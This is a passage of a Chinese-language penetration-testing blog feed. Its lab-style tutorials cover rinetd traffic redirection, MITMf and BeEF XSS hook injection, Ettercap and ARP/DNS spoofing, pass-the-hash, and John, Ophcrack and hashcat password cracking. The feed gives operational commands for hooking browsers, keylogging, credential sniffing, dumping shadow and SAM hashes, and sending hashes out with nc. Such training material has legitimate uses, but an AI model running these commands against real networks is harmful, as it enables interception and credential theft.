    <content type="html"><![CDATA[<blockquote><h3 id="流量操控技术"><a href="#流量操控技术" class="headerlink" title="流量操控技术"></a><strong>流量操控技术</strong></h3></blockquote><ul><li>Traffic manipulation technique</li><li>渗透测试中经常遇到访问受限的网络环境</li><li>使用隐蔽的手段逃避安全检查措施和溯源追踪</li><li>证明看似严格的访问控制仍然存在弱点</li><li>在非受信任的网络中实现安全的数据传输</li><li>部分概念的实现过程略有烧脑</li></ul><h4 id="重定向-Redirection"><a href="#重定向-Redirection" class="headerlink" title="重定向 (Redirection)"></a><strong>重定向</strong> (Redirection)</h4><ul><li>IP,Port<h4 id="隧道-Tunnel"><a href="#隧道-Tunnel" class="headerlink" title="隧道 (Tunnel)"></a><strong>隧道</strong> (Tunnel)</h4></li><li>在不受信任的网络环境中实现安全的通信</li><li>通常使用多种加密技术建立通信隧道</li><li>点到点(IP2IP),端到端(Port2Port)隧道</li><li>VPN:pptp,l2tp,IPSec,SSL vpn</li></ul><h4 id="封装-Encapsulation"><a href="#封装-Encapsulation" class="headerlink" title="封装 (Encapsulation)"></a><strong>封装</strong> (Encapsulation)</h4><ul><li>通常结合在隧道中使用,使用一种协议封装一种协议(RPC o http,VoIP)</li><li>使用网关设备实现不同类型网络的互联互通</li></ul><h4 id="Rinetd"><a href="#Rinetd" class="headerlink" title="Rinetd"></a><strong>Rinetd</strong></h4><p>安装: <code>apt-get install rinetd</code><br>配置: <code>/etc/rinetd.conf</code><br>    <code>bindadd</code> <code>bindport</code> <code>connectadd</code> <code>connectport</code><br>运行: <code>rinetd</code></p><h5 id="应用场景"><a href="#应用场景" class="headerlink" title="应用场景"></a><strong>应用场景</strong></h5><ul><li>重定向web流量,突破上网限制</li><li>远程桌面重定向</li><li>nc重定向获得shell</li><li>不兼容FTP等二次连接的协议</li></ul><h4 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a><strong>测试环境</strong></h4><ul><li>安装monowall防火墙限制只某个端口能连接外网</li><li>一台模拟公司内网win机器,内网通过防火墙允许的端口访问Kali,由Kali重定向到外网</li><li>配置一台防火墙以外的Kali安装Rinetd作流量转发</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;流量操控技术&quot;&gt;&lt;a href=&quot;#流量操控技术&quot; class=&quot;headerlink&quot; title=&quot;流量操控技术&quot;&gt;&lt;/a&gt;&lt;strong&gt;流量操控技术&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;
&lt;li&gt;Traf
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="流量操控" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E6%B5%81%E9%87%8F%E6%93%8D%E6%8E%A7/"/>
    
    
      <category term="nc" scheme="http://c.cat.plus/tags/nc/"/>
    
      <category term="重定向" scheme="http://c.cat.plus/tags/%E9%87%8D%E5%AE%9A%E5%90%91/"/>
    
      <category term="Rinetd" scheme="http://c.cat.plus/tags/Rinetd/"/>
    
      <category term="monowall" scheme="http://c.cat.plus/tags/monowall/"/>
    
      <category term="隧道" scheme="http://c.cat.plus/tags/%E9%9A%A7%E9%81%93/"/>
    
  </entry>
  
  <entry>
    <title>Mitmf中间人攻击结合beef框架XSS攻击</title>
    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://c.cat.plus/2015/05/26/Password_Attacks/%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E6%8A%93%E5%8C%85%E5%97%85%E6%8E%A2%E5%8F%8A%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
    <published>2015-05-26T11:23:36.000Z</published>
    <updated>2020-05-25T08:24:53.942Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a><strong>中间人攻击</strong></h3></blockquote><h4 id="注入XSS"><a href="#注入XSS" class="headerlink" title="注入XSS"></a><strong>注入XSS</strong></h4><ul><li>即使没有XSS漏洞，也可以凌空向每个HTTP请求中注入XSS攻击代码</li><li>一旦得手，影响范围巨大</li><li>如果中间人发生在运营商线路上，很难引起用户注意</li></ul><h4 id="Mitmf-安装"><a href="#Mitmf-安装" class="headerlink" title="Mitmf 安装"></a><strong>Mitmf</strong> 安装</h4><ul><li>曾经号称最好用的中间人攻击工具(kali 2.0后默认未安装)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">apt-get install python-dev python-setuptools libpcap0.8-dev libnetfilterqueue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone3 libcapstone-dev libffi-dev file</span><br><span class="line">apt-get install mitmf</span><br><span class="line">pip uninstall twisted</span><br><span class="line">wget http:&#x2F;&#x2F;twistedmatrix.com&#x2F;Releases&#x2F;Twisted&#x2F;15.5&#x2F;Twisted15.5.0.tar.bz2</span><br><span class="line">pip install .&#x2F;Twisted-15.5.0.tar.bz2</span><br></pre></td></tr></table></figure></li><li>启动beef<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;usr&#x2F;share&#x2F;beef-xss&#x2F;</span><br><span class="line">.&#x2F;beef</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">* mitmf中间人注入xss脚本</span><br><span class="line">&#96;&#96;&#96;</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 1.1.1.1 --target 1.1.1.2 --inject --js-url http:&#x2F;&#x2F;1.1.1.3:3000&#x2F;hook.js</span><br><span class="line">mitmf --spoof --arp -i eth0 --gateway 192.168.20.2 --target 192.168.20.1 --jskeylogger</span><br><span class="line"></span><br><span class="line">--upsidedownternet、--screen(&#x2F;var&#x2F;log&#x2F;mitmf)#颠倒图片及屏幕快照</span><br><span class="line">--ferretng（cookie）、--browserprofiler(浏览器及插件信息)#嗅探cookie及浏览器插件信息</span><br><span class="line">--smbtrap、--smbauth#smb身份认证信息嗅探</span><br><span class="line"></span><br><span class="line">--hsts#协议降级攻击</span><br><span class="line">HTTP Strict Transport Security</span><br><span class="line">防止协议降级、cookie窃取</span><br><span class="line">安全策略通过HTTP响应头”Strict-Transport-Security“实施</span><br><span class="line">限制user-agent、https等</span><br><span class="line"></span><br><span class="line">--filepwn </span><br><span class="line">凌空插后门,传输过程中插入后门</span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;中间人攻击&quot;&gt;&lt;a href=&quot;#中间人攻击&quot; class=&quot;headerlink&quot; title=&quot;中间人攻击&quot;&gt;&lt;/a&gt;&lt;strong&gt;中间人攻击&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;h4 id=&quot;注入XSS&quot;&gt;&lt;a
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
    
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
    
      <category term="Mitmf" scheme="http://c.cat.plus/tags/Mitmf/"/>
    
      <category term="XSS" scheme="http://c.cat.plus/tags/XSS/"/>
    
      <category term="beef" scheme="http://c.cat.plus/tags/beef/"/>
    
  </entry>
  
  <entry>
    <title>Ettercap中间人攻击</title>
    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    <id>http://c.cat.plus/2015/05/26/Password_Attacks/Ettercap%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</id>
    <published>2015-05-26T11:23:36.000Z</published>
    <updated>2020-05-25T08:35:02.262Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="Ettercap"><a href="#Ettercap" class="headerlink" title="Ettercap"></a><strong>Ettercap</strong></h3></blockquote><ul><li>统一的中间人攻击工具</li><li>转发MAC与本机相同，但IP与本机不同的数据包</li><li>支持SSH1、SSL中间人攻击<h4 id="模块划分"><a href="#模块划分" class="headerlink" title="模块划分"></a><strong>模块划分</strong></h4></li><li>Snifer</li><li>MITM</li><li>Filter</li><li>Log </li><li>Plugin</li></ul><h5 id="Snifer"><a href="#Snifer" class="headerlink" title="Snifer"></a><strong>Snifer</strong></h5><p>负责数据包转发<br><strong>Unified</strong></p><ul><li>单网卡情况下独立完成三层包转发</li><li>始终禁用内核IP_Forward功能</li><li><em>Bridge*</em></li><li>双网卡情况下的一层MITM模式</li><li>可作为IPS过滤数据包</li><li>不可在网关上使用(透明网桥)<h5 id="MITM"><a href="#MITM" class="headerlink" title="MITM"></a><strong>MITM</strong></h5></li><li>把流量重定向到ettercap主机上</li><li>可以使用其他工具实现MITM，ettercap之作嗅探和过滤使用</li><li><em>实现MITM的方法*</em></li><li>ARP</li><li>ICMP<br>  ICMP路由重定向，半双工</li><li>DHCP<br>  修改网关地址,半双工<br>  Switch Port Stealing    #交换机端口窃取<br>  flood目标地址是本机，源地址是受害者的包<br>  适用于ARP静态绑定的环境</li><li>NDP<br>  IPv6协议欺骗技术</li></ul><p><strong>2.4以上内核对ARP地址欺骗的约束</strong></p><ul><li>收到非请求的ARP响应包，不更新本地ARP缓存</li><li>Ettercap使用ARP request包进行攻击</li><li><em>Solaris 不根据ARP包更新本地ARP缓存*</em></li><li>Ettercap使用先发ICMP包来更新ARP缓存</li></ul><p><strong>用户操作界面</strong><br>    -T 字符模式界面<br>    -G 图形界面<br>    -C 基于字符的图形界面<br>    -D 后台模式</p><p><strong>指定目标</strong></p><pre><code>IPv4：MAC/IPs/PortsIPv6：MAC/IPs/IPv6/Ports/10.0.0.1-5;10.0.1.33/20-25,80,110</code></pre><p><strong>权限</strong></p><ul><li>需要root权限打开链路层Socket连接,然后使用nobody账号运行</li><li>日志写入目录需要nobody有写入权</li><li>修改etter.conf：EC_UID=65534        #改为0</li></ul><p><strong>基于伪造证书的SSL MITIM</strong></p><pre><code>Bridge模式不支持SSL MITM 需要生成SSL证书openssl genrsa -out etter.ssl.crt 1024openssl req -new-keyetter.ssl.crt -out tmp.csropenssl x509 -req -days 1825 -in tmp.csr -signkey etter.ssl.crt -out tmp.newcat tmp.new&gt;&gt;etter.ssl.crtrm −f tmp.newtmp.csr</code></pre><h3 id="ARP-MITM"><a href="#ARP-MITM" class="headerlink" title="ARP MITM"></a><strong>ARP MITM</strong></h3><p><strong>字符模式</strong></p><pre><code>ettercap -i eth0 -T -M arp -q /192.168.1.1// /192.168.1.2// -F 1.ef -P autoadd -w a.cap -l loginfo -L logall -m message</code></pre><p><strong>图形界面</strong></p><h5 id="SSL-MITM"><a href="#SSL-MITM" class="headerlink" title="SSL MITM"></a><strong>SSL MITM</strong></h5><p><code>vi /etc/ettercap/etter.conf</code></p><h5 id="DNS欺骗"><a href="#DNS欺骗" class="headerlink" title="DNS欺骗"></a><strong>DNS欺骗</strong></h5><p>dns_spoof插件配置文件<br>    <code>vi /etc/ettercap/etter.dns</code></p><h4 id="Ettercap-日志查看"><a href="#Ettercap-日志查看" class="headerlink" title="Ettercap 日志查看"></a><strong>Ettercap 日志查看</strong></h4><pre><code>etterlog -p log.eci     #查看获取的密码etterlog -c log.ecp     #列出Log中的连接etterlog -c -f /1.1.1.1/ log.ecpetterlog -B -n -s -F TCP:1.1.1.1:20:1.1.1.2:1234 log.ecp &gt; aa     #选择相应的连接并榨取文件</code></pre><h4 id="Filter-过滤器"><a href="#Filter-过滤器" class="headerlink" title="Filter    过滤器"></a><strong>Filter</strong>    过滤器</h4><pre><code>ls /usr/share/ettercap/SSH-2.xx / SSH-1.99 / SSH-1.51etterfilter etter.filter.ssh -o ssh.ef        #编译可执行二进制文件,-F 作SSH嗅探</code></pre><h5 id="替换HTTP内容"><a href="#替换HTTP内容" class="headerlink" title="替换HTTP内容"></a>替换HTTP内容</h5><ul><li>替换图片</li><li>替换exe后门程序<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (ip.proto &#x3D;&#x3D; TCP &amp;&amp; tcp.src &#x3D;&#x3D; 80) &#123;</span><br><span class="line">msg(&quot;data on TCP 80\n&quot;);</span><br><span class="line">replace(&quot;img src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG src&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">replace(&quot;IMG SRC&#x3D;&quot;, &quot;img src&#x3D;\&quot;http:&#x2F;&#x2F;1.1.1.1&#x2F;1.gif\&quot; &quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h4 id="ICMP-中间人攻击"><a href="#ICMP-中间人攻击" class="headerlink" title="ICMP 中间人攻击"></a><strong>ICMP 中间人攻击</strong></h4><pre><code>-M icmp:00:11:22:33:44:55/10.0.0.1        #真实网关的MAC/IP</code></pre><h4 id="DHCP-中间人攻击"><a href="#DHCP-中间人攻击" class="headerlink" title="DHCP 中间人攻击"></a><strong>DHCP 中间人攻击</strong></h4><pre><code>−M dhcp:192.168.0.30,35,50−60/255.255.255.0/192.168.0.1        #DNS </code></pre><h4 id="Port-基于交换机端口窃取的中间人攻击"><a href="#Port-基于交换机端口窃取的中间人攻击" class="headerlink" title="Port 基于交换机端口窃取的中间人攻击"></a><strong>Port 基于交换机端口窃取的中间人攻击</strong></h4><pre><code>-M port /1.1.1.1/ /1.1.1.2/</code></pre><h4 id="Ndp-IPv6协议欺骗中间人攻击"><a href="#Ndp-IPv6协议欺骗中间人攻击" class="headerlink" title="Ndp IPv6协议欺骗中间人攻击"></a><strong>Ndp</strong> IPv6协议欺骗中间人攻击</h4><pre><code>-M ndp //fe80::260d:afff:fe6e:f378/ //2001:db8::2:1/</code></pre><h3 id="Pass-the-Hash-PTH"><a href="#Pass-the-Hash-PTH" class="headerlink" title="Pass the Hash (PTH)"></a><strong>Pass the Hash</strong> (PTH)</h3><ul><li>密码破解耗费时间资源巨大</li><li>使用密文提交给服务器直接完成身份认证</li><li>NTLM/LM是没有加盐的静态HASH密文</li><li>企业中使用ghost等工具克隆安装系统</li></ul><h4 id="利用sam-hash密文远程登录windows"><a href="#利用sam-hash密文远程登录windows" class="headerlink" title="利用sam hash密文远程登录windows"></a><strong>利用sam hash密文远程登录windows</strong></h4><pre><code>pth-winexe -U w7%aad3b435b51404eeaad3b435b51404ee:ed1bfaeb3063 716ab7fe2a11faf126d8 //1.1.1.1 cmd</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;Ettercap&quot;&gt;&lt;a href=&quot;#Ettercap&quot; class=&quot;headerlink&quot; title=&quot;Ettercap&quot;&gt;&lt;/a&gt;&lt;strong&gt;Ettercap&lt;/strong&gt;&lt;/h3&gt;&lt;/blockquote&gt;
&lt;ul&gt;

      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
    
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
    
      <category term="Ettercap" scheme="http://c.cat.plus/tags/Ettercap/"/>
    
      <category term="PTH" scheme="http://c.cat.plus/tags/PTH/"/>
    
      <category term="中间人攻击" scheme="http://c.cat.plus/tags/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>使用ARP和DNS欺骗实现流量劫持密码嗅探</title>
    <link href="http://c.cat.plus/2015/05/26/Password_Attacks/ARP%E6%AC%BA%E9%AA%97%E5%92%8CDNS%E6%AC%BA%E9%AA%97%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/"/>
    <id>http://c.cat.plus/2015/05/26/Password_Attacks/ARP%E6%AC%BA%E9%AA%97%E5%92%8CDNS%E6%AC%BA%E9%AA%97%E5%8F%8A%E7%BD%91%E7%BB%9C%E5%AF%86%E7%A0%81%E5%97%85%E6%8E%A2/</id>
    <published>2015-05-25T21:53:13.000Z</published>
    <updated>2020-05-25T08:43:39.062Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="ARP欺骗-网络密码嗅探"><a href="#ARP欺骗-网络密码嗅探" class="headerlink" title="ARP欺骗-网络密码嗅探"></a><strong>ARP欺骗-网络密码嗅探</strong></h3></blockquote><p><strong>二层地址和三层地址</strong> MAC硬件地址&amp;IP地址</p><ul><li>IP 网络到网络</li><li>MAC 主机到主机</li></ul><h4 id="交换机与HUB"><a href="#交换机与HUB" class="headerlink" title="交换机与HUB"></a><strong>交换机与HUB</strong></h4><ul><li>交换机是二层设备,HUB是一层设备</li><li>HUB全端口转发</li><li>交换机根据学习地址转发</li><li>混杂模式抓包</li></ul><h4 id="ARP协议-地址解析协议"><a href="#ARP协议-地址解析协议" class="headerlink" title="ARP协议 地址解析协议"></a><strong>ARP协议</strong> 地址解析协议</h4><ul><li>把IP地址解析对应的MAC地址</li><li>免费ARP</li><li>基于广播学习</li><li>以太网头、ARP头</li><li>请求 <strong>响应</strong> 相对独立</li><li>基于传闻的协议</li><li>手动修改数据包实现ARP欺骗</li></ul><h4 id="arpspoof"><a href="#arpspoof" class="headerlink" title="arpspoof"></a><strong>arpspoof</strong></h4><pre><code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward         #开启路由转发功能,使被欺骗者可上网arpspoof -t 1.1.1.12 -r 1.1.1.1            #欺骗用户和网关,双向欺骗实现中间人攻击</code></pre><h4 id="网络抓包嗅探"><a href="#网络抓包嗅探" class="headerlink" title="网络抓包嗅探"></a><strong>网络抓包嗅探</strong></h4><pre><code>driftnet -i eth0 -a -d tempdir -s        #抓包还原图片和音频并保存指定目录urlsnarf -i eth0                        #嗅探urlwebspy -i eth0 1.1.1.10                    #嗅探url,工具有BUGdsniff -i eth0 -m                        #嗅探密码    cat /usr/share/dsniff/dsniff.services    #查看支持协议类型解码dnsspoof -i eth0 -f /usr/share/dsniff/dnsspoof.hosts        #dns欺骗</code></pre><h4 id="DNS欺骗代理"><a href="#DNS欺骗代理" class="headerlink" title="DNS欺骗代理"></a><strong>DNS欺骗代理</strong></h4><pre><code>dnschef --fakeip=1.1.1.10 -fakedomains=www.google.com,www.youtube.com --interface 1.1.1.2 -q将被害者DNS指向伪造的DNS服务器</code></pre>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;ARP欺骗-网络密码嗅探&quot;&gt;&lt;a href=&quot;#ARP欺骗-网络密码嗅探&quot; class=&quot;headerlink&quot; title=&quot;ARP欺骗-网络密码嗅探&quot;&gt;&lt;/a&gt;&lt;strong&gt;ARP欺骗-网络密码嗅探&lt;/strong&gt;&lt;/h3&gt;&lt;/b
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="嗅探欺骗" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E5%97%85%E6%8E%A2%E6%AC%BA%E9%AA%97/"/>
    
    
      <category term="arpspoof" scheme="http://c.cat.plus/tags/arpspoof/"/>
    
      <category term="driftnet" scheme="http://c.cat.plus/tags/driftnet/"/>
    
      <category term="dsniff" scheme="http://c.cat.plus/tags/dsniff/"/>
    
      <category term="dnsspoof" scheme="http://c.cat.plus/tags/dnsspoof/"/>
    
  </entry>
  
  <entry>
    <title>John离线密码破解及Ophcrack彩虹表密码破解</title>
    <link href="http://c.cat.plus/2015/05/24/Password_Attacks/John%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%8F%8AOphcrack%20%E5%BD%A9%E8%99%B9%E8%A1%A8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/24/Password_Attacks/John%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3%E5%8F%8AOphcrack%20%E5%BD%A9%E8%99%B9%E8%A1%A8%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-23T22:55:33.000Z</published>
    <updated>2020-05-25T07:51:29.694Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="John-离线密码破解"><a href="#John-离线密码破解" class="headerlink" title="John 离线密码破解"></a><strong>John</strong> 离线密码破解</h3></blockquote><ul><li>支持众多服务应用的加密破解<br>   <code>john --list=formats</code></li><li>支持某些对称加密算法破解<h4 id="模式"><a href="#模式" class="headerlink" title="模式"></a><strong>模式</strong></h4></li><li>Wordlist：基于规则的字典破解 </li><li>Single crack:默认被首先执行，使用Login/GECOS信息尝试破解<br>  修改GECOS: <code>chfn -f usernamefull -r room_301 -w 12345 -h 12345 -o penetration cat</code></li><li>Incremental:增量,所有或指定字符集的暴力破解</li><li>External：需要在主配配文件中用C语言子集编程<h5 id="默认破解模式"><a href="#默认破解模式" class="headerlink" title="默认破解模式"></a><strong>默认破解模式</strong></h5></li><li>Single、wordlist、incremental</li><li>主配置文件中指定默认wordlist</li></ul><h4 id="破解Linux系统账号密码"><a href="#破解Linux系统账号密码" class="headerlink" title="破解Linux系统账号密码"></a><strong>破解Linux系统账号密码</strong></h4><pre><code>unshadow /etc/passwd /etc/shadow &gt; pass.txt        #合并系统账号及密码并输出到文件john pass.txt     #执行破解john --show pass         #查看破解结果</code></pre><h4 id="破解windows密码"><a href="#破解windows密码" class="headerlink" title="破解windows密码"></a><strong>破解windows密码</strong></h4><pre><code>john sam.dump --wordlist=password.lst --format=ntjohn sam.dump --format=nt --show    #查看破解结果</code></pre><h4 id="Johnny-图形化界面的john"><a href="#Johnny-图形化界面的john" class="headerlink" title="Johnny 图形化界面的john"></a><strong>Johnny 图形化界面的john</strong></h4><pre><code>johnny</code></pre><p>example:<br><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/johnny.png" alt="johnny"></p><blockquote><h3 id="Ophcrack-离线密码破解"><a href="#Ophcrack-离线密码破解" class="headerlink" title="Ophcrack 离线密码破解"></a><strong>Ophcrack</strong> 离线密码破解</h3></blockquote><ul><li>基于彩虹表的LM、NTLM密码破解软件</li><li>彩虹表: <code>http://ophcrack.sourceforge.net/tables.php</code><br><img src="https://github.com/iseanhe/iseanhe.github.io/raw/master/img/mdphotos/Ophcrack.png" alt="Ophcrack"><br>在线密码破解</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;h3 id=&quot;John-离线密码破解&quot;&gt;&lt;a href=&quot;#John-离线密码破解&quot; class=&quot;headerlink&quot; title=&quot;John 离线密码破解&quot;&gt;&lt;/a&gt;&lt;strong&gt;John&lt;/strong&gt; 离线密码破解&lt;/h3&gt;&lt;/block
      
    
    </summary>
    
    
      <category term="渗透测试" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="密码攻击" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/"/>
    
      <category term="暴力破解" scheme="http://c.cat.plus/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E5%AF%86%E7%A0%81%E6%94%BB%E5%87%BB/%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/"/>
    
    
      <category term="John" scheme="http://c.cat.plus/tags/John/"/>
    
      <category term="彩虹表" scheme="http://c.cat.plus/tags/%E5%BD%A9%E8%99%B9%E8%A1%A8/"/>
    
      <category term="Ophcrack" scheme="http://c.cat.plus/tags/Ophcrack/"/>
    
      <category term="离线密码破解" scheme="http://c.cat.plus/tags/%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="Linux密码破解" scheme="http://c.cat.plus/tags/Linux%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    
      <category term="Windows密码" scheme="http://c.cat.plus/tags/Windows%E5%AF%86%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>Hash识别及Hashcat离线密码破解</title>
    <link href="http://c.cat.plus/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/"/>
    <id>http://c.cat.plus/2015/05/23/Password_Attacks/Hashcat%E7%A6%BB%E7%BA%BF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3/</id>
    <published>2015-05-23T12:35:53.000Z</published>
    <updated>2020-05-25T07:42:49.002Z</updated>
    
    <content type="html"><![CDATA[<blockquote><h3 id="离线密码破解"><a href="#离线密码破解" class="headerlink" title="离线密码破解"></a>离线密码破解</h3></blockquote><h4 id="身份认证"><a href="#身份认证" class="headerlink" title="身份认证"></a>身份认证</h4><ul><li>禁止明文传输密码</li><li>每次认证使用HASH算法加密密码传输(HASH算法加密容易、解密困难)</li><li>服务器端用户数据库应加盐加密保存</li></ul><h4 id="破解思路"><a href="#破解思路" class="headerlink" title="破解思路"></a>破解思路</h4><ul><li>嗅探获取密码HASH</li><li>利用漏洞登陆服务器并从用户数据库获取密码HASH</li><li>识别HASH类型<br>  长度、字符集</li><li>利用离线破解工具碰撞密码HASH</li></ul><h4 id="优势"><a href="#优势" class="headerlink" title="优势"></a>优势</h4><ul><li>离线不会触发密码锁定机制</li><li>不会产生大量登陆失败日志引起管理员注意</li></ul><blockquote><h4 id="HASH识别工具"><a href="#HASH识别工具" class="headerlink" title="HASH识别工具"></a>HASH识别工具</h4></blockquote><ul><li><code>hash‐identifier</code></li><li><code>Hashid</code></li><li>可能识别错误或无法识别</li></ul><blockquote><h4 id="Windows-HASH获取工具"><a href="#Windows-HASH获取工具" class="headerlink" title="Windows HASH获取工具"></a>Windows HASH获取工具</h4></blockquote><ul><li>利用漏洞：<code>Pwdump</code>,<code>fgdump</code>,<code>mimikatz</code>,<code>wce</code> </li><li>物理接触：<code>samdump2</code></li><li>Kali ISO 启动虚拟机 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fdesk -l</span><br><span class="line">mount &#x2F;dev&#x2F;sda1 &#x2F;mnt</span><br><span class="line">cd &#x2F;mnt&#x2F;Windows&#x2F;System32&#x2F;config</span><br><span class="line">samdump2 SYSTEM SAM -o sam.hash</span><br></pre></td></tr></table></figure></li><li>利用nc传输HASH<pre><code>nc -nvlp 333nc 192.168.190.128 333</code></pre><h4 id="Windows系统syskey加密工具"><a href="#Windows系统syskey加密工具" class="headerlink" 